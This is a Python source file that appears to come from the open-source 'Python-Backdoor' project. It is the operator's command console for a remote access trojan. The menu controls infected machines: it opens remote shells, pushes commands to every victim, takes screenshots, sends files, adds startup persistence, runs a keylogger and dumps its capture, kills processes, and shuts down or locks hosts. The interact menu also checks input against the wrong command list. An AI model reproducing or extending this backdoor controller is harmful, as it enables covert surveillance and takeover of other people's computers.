"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import socket
from threading import Thread

import src.defs as c
from src.defs import *


def menu_help(_list):
    for i in range(0, len(_list)):
        print(f"{_list[i]['arg']} {_list[i]['info']}", end="")

        if "arg2" in _list[i]:
            print(f" <{_list[i]['arg2']}>", end="")

        print()


def check_input(_input, _list):
    for arg in _list:
        if _input[0] == arg["arg"]:
            if "arg2" in arg and len(_input) < 2:
                print(f"Missing argument: {arg['arg2']}")
                return False
            return True
    print("Command not found")
    return False


class View:
    def __init__(self, control):
        self.control = control
        self.main_menu()

    def main_menu(self):
        while True:
            choice = input("\n>> ").upper().split(" ")

            if check_input(choice, SERVER_MAIN_COMMAND_LIST):
                match choice[0]:
                    case c.MENU_HELP: menu_help(SERVER_MAIN_COMMAND_LIST)
                    case c.MENU_LIST_CONNECTIONS: self.control.list_connections()
                    case c.MENU_SEND_ALL_CMD: self.control.send_command_all(choice[1])
                    case c.MENU_INTERACT:
                        if self.control.interact(choice[1]):
                            self.interact_menu()
                    case c.MENU_CLOSE_CONNECTION: self.control.socket.close_one(choice[1])
                    case c.MENU_CLOSE_ALL: self.control.close_all()
                    case c.MENU_OPEN_SHELL: self.control.command_shell(choice[1])

    def interact_menu(self):
        menu_help(SERVER_INTERACT_COMMAND_LIST)

        try:
            while True:
                choice = input("\n>>> ").upper().split(" ")

                if check_input(choice, SERVER_MAIN_COMMAND_LIST):
                    match choice[0]:
                        case c.MENU_INTERACT_HELP: menu_help(SERVER_INTERACT_COMMAND_LIST)
                        case c.MENU_INTERACT_MSG: self.control.message(choice[1])
                        case c.MENU_INTERACT_SEND: self.control.send_file()
                        case c.MENU_INTERACT_SCRN: self.control.screenshot()
                        case c.MENU_INTERACT_STARTUP:
                            if choice[1] == c.MENU_INTERACT_STARTUP_ADD:
                                self.control.startup()
                            elif choice[1] == c.MENU_INTERACT_STARTUP_RMV:
                                self.control.startup(True)
                            else:
                                print("Invalid argument")
                        case c.MENU_INTERACT_INFO: self.control.user_info()
                        case c.MENU_INTERACT_SHELL: self.control.command_shell()
                        case c.MENU_INTERACT_PYTHON: self.control.python_interpreter()
                        case c.MENU_INTERACT_KEYLOG:
                            if choice[1] == c.MENU_INTERACT_KEYLOG_START:
                                self.control.keylogger_start()
                            elif choice[1] == c.MENU_INTERACT_KEYLOG_STOP:
                                self.control.keylogger_stop()
                            elif choice[1] == c.MENU_INTERACT_KEYLOG_DUMP:
                                self.control.keylogger_dump()
                            else:
                                print("Invalid argument")
                        case c.MENU_INTERACT_DISABLE_PROCESS: self.control.disable_process(choice[1])
                        case c.MENU_INTERACT_SHUT:
                            if choice[1] == c.MENU_INTERACT_SHUT:
                                self.control.shutdown()
                            elif choice[1] == c.MENU_INTERACT_SHUT_RESTART:
                                self.control.restart()
                            elif choice[1] == c.MENU_INTERACT_SHUT_LOCK:
                                self.control.lock()
                            else:
                                print("Invalid argument")
                        case c.MENU_INTERACT_BACKGROUND:
                            self.control.socket.clear_curr()
                            break
                        case c.MENU_INTERACT_CLOSE:
                            self.control.socket.close()
                            break

        except socket.error as e:  # if there is a socket error
            print(f"Error, connection was lost! {e}")
